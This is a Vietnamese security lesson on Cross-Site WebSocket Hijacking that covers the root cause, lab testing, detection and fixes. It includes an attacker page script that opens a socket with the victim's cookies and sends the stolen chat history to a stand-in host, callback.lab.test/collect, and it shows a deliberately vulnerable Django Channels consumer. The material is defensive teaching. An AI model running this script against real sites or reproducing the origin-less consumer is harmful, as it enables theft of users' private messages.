---
schema_version: 1
id: WEB-A05-WEBSOCKET-HIJACKING
title: "Cross-Site WebSocket Hijacking (CSWSH)"
slug: websocket-hijacking
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-1385
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Cross-Site WebSocket Hijacking (CSWSH)

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Cross-Site WebSocket Hijacking (CSWSH) bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Bình thường, khi bạn duyệt web, trình duyệt hoạt động theo kiểu hỏi-đáp: bạn gửi một yêu cầu (request), máy chủ trả về một phản hồi (response) rồi kết thúc. Tuy nhiên, với các ứng dụng thời gian thực như nhắn tin (chat) hay bảng giá chứng khoán, cơ chế này quá chậm chạp. Để giải quyết, công nghệ WebSocket ra đời, giúp mở ra một đường ống liên lạc thông suốt hai chiều giữa trình duyệt và máy chủ. Khi bắt đầu thiết lập đường ống này (quá trình handshake), trình duyệt sẽ gửi kèm cookie xác thực của bạn. Điểm đặc biệt là WebSocket không bị ràng buộc bởi Chính sách đồng nguồn gốc (SOP), nghĩa là một trang web lạ cũng có thể gửi yêu cầu mở kết nối WebSocket đến máy chủ của bạn.

```http
GET /chat HTTP/1.1
Host: app.victim.lab.test
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.victim.lab.test
Cookie: session=abc123def456
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Điểm quan trọng: handshake là một **HTTP request thông thường** — trình duyệt tự động gửi kèm cookie. Header `Origin` được trình duyệt thêm vào nhưng **server phải tự kiểm tra** — nếu không, bất kỳ trang web nào cũng có thể mở WebSocket đến server của bạn với cookie của nạn nhân.

Khác với AJAX (bị Same-Origin Policy chặn), WebSocket **không bị SOP hạn chế** — trình duyệt cho phép bất kỳ origin nào mở kết nối WebSocket đến bất kỳ server nào. Đây là nguyên nhân gốc rễ của CSWSH.

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng Cross-Site WebSocket Hijacking (hay CSWSH) xảy ra khi máy chủ WebSocket "nhắm mắt" chấp nhận mọi yêu cầu kết nối mà không thèm kiểm tra xem yêu cầu đó đến từ trang web nào (bỏ qua tiêu đề `Origin`), đồng thời chỉ dựa vào cookie tự động gửi kèm để xác thực người dùng. Kẻ tấn công có thể dụ dỗ bạn truy cập vào một trang web độc hại của họ. Trang web này sẽ âm thầm gửi yêu cầu mở kết nối WebSocket tới tài khoản của bạn trên máy chủ đích. Vì trình duyệt tự động đính kèm cookie của bạn, kết nối sẽ được thiết lập thành công dưới danh nghĩa của bạn. Khác với CSRF thông thường chỉ gửi đi một lệnh đơn lẻ, cuộc tấn công này nguy hiểm hơn gấp nhiều lần vì nó mở ra một đường ống hai chiều: kẻ tấn công có thể liên tục gửi lệnh và đọc toàn bộ dữ liệu phản hồi riêng tư của bạn trong thời gian thực.

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** WebSocket session đã xác thực và message.
- **Actor, xác thực và role:** trang untrusted mở socket bằng cookie của nạn nhân role user.
- **Điều kiện khai thác:** ambient cookie xác thực handshake nhưng thiếu Origin hoặc token gắn session.
- **Browser, proxy, framework và phiên bản:** Chromium và server ws/websockets được pin trên .lab.test; loopback; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với websocket hijacking, ambient cookie xác thực handshake nhưng thiếu Origin hoặc token gắn session. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy Chromium và server ws/websockets được pin trên .lab.test; loopback; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case websocket hijacking; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “ambient cookie xác thực handshake nhưng thiếu Origin hoặc token gắn session”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của websocket hijacking; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây được giữ để technical review. `static-verified` chỉ xác nhận cấu trúc/annotation đã qua gate tĩnh; nó **không** chứng minh payload hoạt động trên mọi phiên bản. Trước khi chạy phải đối chiếu `context`, điều kiện cần, encoding, expected result và risk. Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.

**Bước 1 — Kẻ tấn công tạo trang khai thác:**

<!-- payload-id: WEB-A05-WEBSOCKET-HIJACKING-001 -->
<!-- context: pinned Chromium opens wss://victim.lab.test/chat from untrusted.lab.test -->
<!-- prerequisites: both hosts map to loopback; synthetic user cookie; one socket and one fixture message; no external fetch -->
<!-- encoding: WebSocket handshake is browser-generated; JSON message is UTF-8 text and contains only action=get_history -->
<!-- expected-result: vulnerable server accepts wrong Origin and returns fixture history; fixed server closes handshake before messages -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Attacker's page: https://callback.lab.test/hijack.html -->
<!-- Victim visits this page while logged into victim.lab.test -->
<script>
  // Browser sends victim's cookies with the handshake
  var ws = new WebSocket("wss://victim.lab.test/chat");

  ws.onopen = function() {
    console.log("Connected with victim's session!");
    // Send commands as the victim
    ws.send(JSON.stringify({
      action: "get_chat_history",
      room: "private"
    }));
  };

  ws.onmessage = function(event) {
    // Receive victim's private data
    var data = JSON.parse(event.data);

    // Exfiltrate to attacker's server
    fetch("https://callback.lab.test/collect", {
      method: "POST",
      body: JSON.stringify({
        stolen: data,
        timestamp: Date.now()
      })
    });
  };
</script>
```

**Bước 2 — Server dễ tổn thương:**

<!-- payload-id: WEB-A05-WEBSOCKET-HIJACKING-002 -->
<!-- context: pinned Django Channels consumer authenticates cookie but intentionally omits Origin validation -->
<!-- prerequisites: loopback ASGI fixture; synthetic user/session only; one trusted and one untrusted handshake -->
<!-- encoding: ASGI scope supplies Origin and cookie headers as bytes decoded by the framework; no manual framing -->
<!-- expected-result: untrusted Origin is accepted only by vulnerable consumer; AllowedHostsOriginValidator rejects it -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Vulnerable WebSocket server (Python/Django Channels)
# ❌ No Origin header validation
class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Only checks session cookie — automatically sent by browser
        user = self.scope["user"]
        if user.is_authenticated:
            self.accept()  # Accepts connection from ANY origin
        else:
            self.close()

    def receive(self, text_data):
        data = json.loads(text_data)
        if data["action"] == "get_chat_history":
            # Returns private messages to whoever connects
            history = Message.objects.filter(room=data["room"])
            self.send(text_data=json.dumps({
                "messages": [m.content for m in history]
            }))
```

## 9. Code dễ bị lỗi và code an toàn

```python
# ❌ VULNERABLE: No origin check, cookie-only auth
class NotificationConsumer(WebsocketConsumer):
    def connect(self):
        if self.scope["user"].is_authenticated:
            self.accept()  # Any website can hijack this

# ✅ SECURE: Origin validation + token-based auth
class NotificationConsumer(WebsocketConsumer):
    ALLOWED_ORIGINS = ["https://myapp.lab.test"]

    def connect(self):
        # Check Origin header
        headers = dict(self.scope["headers"])
        origin = headers.get(b"origin", b"").decode()

        if origin not in self.ALLOWED_ORIGINS:
            self.close(code=4003)
            return

        # Require token-based authentication (not just cookies)
        query = parse_qs(self.scope["query_string"].decode())
        token = query.get("token", [None])[0]

        if not validate_ws_token(token, self.scope["user"]):
            self.close(code=4001)
            return

        self.accept()
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Xác minh Origin và token gắn session ở handshake; authorize từng operation message.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Xác thực tiêu đề Origin trong quá trình bắt tay WebSocket và sử dụng cơ chế xác thực dựa trên token chống CSRF.
- **Các bước chi tiết**:
  - Kiểm tra Origin header trong handshake để đảm bảo yêu cầu kết nối đến từ domain được cho phép.
  - Sử dụng token xác thực ngẫu nhiên, không trùng lặp (CSRF token) được truyền qua handshake hoặc thông điệp đầu tiên.
  - Triển khai xác thực dựa trên token (Token-based auth) thay vì chỉ tin tưởng vào Cookie.

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **WebSocket**: Giao thức hỗ trợ truyền dữ liệu hai chiều (full-duplex) liên tục qua một kết nối TCP duy nhất.
- **CSWSH (Cross-Site WebSocket Hijacking)**: Tấn công chiếm quyền kết nối WebSocket của người dùng từ một trang web độc hại chéo trang.
- **Handshake**: Quá trình khởi tạo thiết lập kết nối ban đầu giữa client và server.
- **Origin Header**: Tiêu đề HTTP tự động điền bởi trình duyệt chỉ ra tên miền gửi yêu cầu.
- **Full-Duplex**: Chế độ truyền tin hai chiều diễn ra đồng thời cùng lúc.

## 16. Bài liên quan và đọc thêm

- [PostMessage Exploitation](../postmessage-exploitation/) — Các vấn đề bảo mật Client-Side.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** OWASP. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/1385.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** Christian Schneider. https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
